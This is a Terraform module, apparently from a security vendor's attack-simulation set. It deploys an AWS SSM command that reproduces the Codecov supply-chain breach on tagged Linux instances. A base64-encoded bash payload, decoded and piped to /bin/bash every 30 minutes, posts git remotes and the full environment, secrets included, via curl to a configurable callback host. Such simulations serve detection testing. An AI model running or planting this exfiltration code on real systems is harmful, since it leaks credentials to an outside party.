locals {
    host_ip = var.host_ip
    host_port = var.host_port
    callback_url = var.use_ssl == true ? "https://${local.host_ip}:${local.host_port}" : "http://${local.host_ip}:${local.host_port}"
    payload = <<-EOT
    LOGFILE=/tmp/attacker_exec_git_codecov.log
    function log {
        echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1"
        echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1" >> $LOGFILE
    }
    truncate -s 0 $LOGFILE
    log "checking for git..."
    while ! which git; do
        log "git not found - waiting"
        sleep 10
    done
    log "running curl post: curl -sm 0.5 -d "$(git remote -v)<<<<<< ENV $(env) ${local.callback_url}/upload/v2"
    curl -sm 0.5 -d "$(git remote -v)<<<<<< ENV $(env)" ${local.callback_url}/upload/v2 >> $LOGFILE 2>&1
    log "done"
    EOT
    base64_payload = base64encode(local.payload)
}

resource "aws_ssm_document" "exec_git_codecov" {
  name          = "exec_git_codecov"
  document_type = "Command"

  content = jsonencode(
    {
        "schemaVersion": "2.2",
        "description": "exec git codecov callhome",
        "mainSteps": [
            {
                "action": "aws:runShellScript",
                "name": "exec_git_codecov",
                "precondition": {
                    "StringEquals": [
                        "platformType",
                        "Linux"
                    ]
                },
                "inputs": {
                    "timeoutSeconds": "60",
                    "runCommand": [
                        "echo \"${local.base64_payload}\" > /tmp/payload",
                        "echo '${local.base64_payload}' | base64 -d | /bin/bash -"
                    ]
                }
            }
        ]
    })
}

resource "aws_resourcegroups_group" "exec_git_codecov" {
    name = "exec_git_codecov"

    resource_query {
        query = jsonencode(var.resource_query_exec_git_codecov)
    }

    tags = {
        billing = var.environment
        owner   = "lacework"
    }
}

resource "aws_ssm_association" "exec_git_codecov" {
    association_name = "exec_git_codecov"

    name = aws_ssm_document.exec_git_codecov.name

    targets {
        key = "resource-groups:Name"
        values = [
            aws_resourcegroups_group.exec_git_codecov.name,
        ]
    }

    compliance_severity = "HIGH"

    # every 30 minutes
    schedule_expression = "cron(0/30 * * * ? *)"
    
    # will apply when updated and interval when false
    apply_only_at_cron_interval = false
}